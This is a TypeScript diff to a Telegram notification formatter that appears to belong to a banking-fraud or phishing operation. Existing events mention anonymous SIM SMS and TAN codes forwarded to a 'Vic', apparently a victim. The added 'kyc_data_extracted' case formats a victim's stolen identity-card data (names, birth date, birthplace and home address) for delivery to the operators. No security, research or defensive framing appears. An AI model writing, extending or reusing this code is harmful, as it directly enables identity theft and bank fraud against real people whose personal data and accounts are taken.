@@ -10,6 +10,7 @@ export type TelegramEvent =
   | "anosim_sms_received"
   | "user_account_created"
   | "tan_forwarded_to_vic"
+  | "kyc_data_extracted"
   | "test";
 
 interface Payload {
@@ -101,6 +102,26 @@ function formatMessage(event: TelegramEvent, p: Payload): string {
         p.verification_title ? `🏦 Auftrag: ${esc(p.verification_title)}` : null,
         p.code ? `🔢 Code: ${code(p.code)}` : null,
       ].filter(Boolean).join("\n");
+
+    case "kyc_data_extracted": {
+      const dash = "—";
+      const val = (v: unknown) => {
+        const s = String(v ?? "").trim();
+        return s ? esc(s) : dash;
+      };
+      return [
+        `🪪 <b>Neuer Ausweis verfügbar</b>`,
+        `👤 Vic: ${esc(p.vic_name || "Unbekannt")}`,
+        ``,
+        `<b>Vorname:</b> ${val(p.first_names)}`,
+        `<b>Nachname:</b> ${val(p.last_name)}`,
+        `<b>Geburtsname:</b> ${val(p.birth_name)}`,
+        `<b>Geburtsdatum:</b> ${val(p.birth_date)}`,
+        `<b>Geburtsort:</b> ${val(p.birth_place)}`,
+        `<b>Straße & Hausnummer:</b> ${val(p.street)}`,
+        `<b>PLZ Stadt:</b> ${[p.zip_code, p.city].filter((x) => String(x ?? "").trim()).map(esc).join(" ") || dash}`,
+      ].join("\n");
+    }
 
     case "test":
       return `🔔 <b>Test-Nachricht</b>\nDie Telegram-Anbindung funktioniert.`;
